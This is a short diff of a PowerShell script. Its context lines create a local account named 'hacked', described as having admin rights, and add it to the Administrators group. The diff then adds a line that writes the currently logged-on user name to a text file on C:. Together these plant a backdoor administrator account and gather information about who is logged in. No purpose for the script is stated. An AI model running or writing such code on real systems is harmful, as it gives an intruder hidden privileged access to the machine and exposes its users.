@@ -3,3 +3,5 @@ New-LocalUser -Name "hacked" -Description "New user with admin rights" -Password
 
 # Add the user to the Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member "hacked"
+
+Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"
